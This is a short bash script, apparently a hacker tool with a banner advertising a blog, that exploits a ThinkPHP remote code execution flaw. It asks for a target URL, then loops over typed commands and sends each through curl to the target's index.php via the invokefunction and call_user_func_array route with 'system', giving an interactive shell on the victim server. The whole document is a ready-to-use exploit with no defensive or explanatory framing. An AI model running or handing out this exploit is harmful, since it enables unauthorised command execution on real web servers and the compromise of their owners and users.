echo "##############################################
ThinkPHP R.C.E
don't forget to visit our blog dude
https://shuuzu.net
##############################################"

read -p "target bro: " tar
while [ true ]; do

        read -p $'\e[31mroot@localhost:~#\e[0m ' ask_cmd
        curl -m 5 -k ${tar}"/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=$ask_cmd"
done
